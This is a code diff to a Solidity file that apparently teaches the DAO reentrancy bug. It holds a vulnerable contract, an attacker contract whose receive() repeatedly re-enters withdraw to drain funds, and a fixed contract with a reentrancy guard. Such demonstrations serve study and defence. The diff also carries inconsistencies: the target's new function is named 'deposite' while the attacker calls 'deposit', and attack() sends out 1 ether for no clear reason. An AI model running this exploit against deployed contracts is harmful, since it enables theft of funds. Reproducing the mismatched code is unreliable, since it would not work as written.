@@ -1,5 +1,6 @@
-// SPDX-Licence-Identifer: MIT
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.34;
+
 
 /*
 
@@ -60,6 +61,9 @@ error NotOwner();
 contract TheDAO_Vulnerable {
 	mapping(address => uint256) public balances;
 
+	function deposite() payable public {
+        balances[msg.sender] += msg.value;
+    }
 
     function withdraw(uint256 amount) public {
         if(balances[msg.sender] < amount) revert NotEnough();
@@ -89,22 +93,26 @@ contract Attacker {
 
     }
 
+    function exploitDeposit() external payable {
+    	target.deposit{value: msg.value}();
+	}
+
     function attack() external {
+    	(bool success,) = msg.sender.call{value: 1 ether}("");
+    	require(success, "transfer failed");
         target.withdraw(amountToWithdraw);
     }
 
     receive() external payable {
-        if(address(target).balances >= amountToWithdraw){
-            if(address(this).balances <= whenToStop) {
+        if(address(target).balance >= amountToWithdraw && address(this).balance < whenToStop ){
             	target.withdraw(amountToWithdraw);
-        	}
         }
     }
 
     function collect(address _to) public {
     	if(owner != msg.sender) revert NotOwner();
 
-    	(bool success, ) = msg.sender.call{value : address(this).balance}("");
+    	(bool success, ) = payable(_to).call{value : address(this).balance}("");
     	require(success , "transfer failed");
     }
 }
@@ -126,6 +134,14 @@ contract TheDAO_Fixed {
 
 		status = NOT_ENTERED;
 	}
+
+	constructor() {
+		status = NOT_ENTERED;
+	}
+
+	function deposite() payable public {
+        balances[msg.sender] += msg.value;
+    }
 
     function withdraw(uint256 amount) public nonReentrant {
         if(balances[msg.sender] < amount) revert NotEnough();
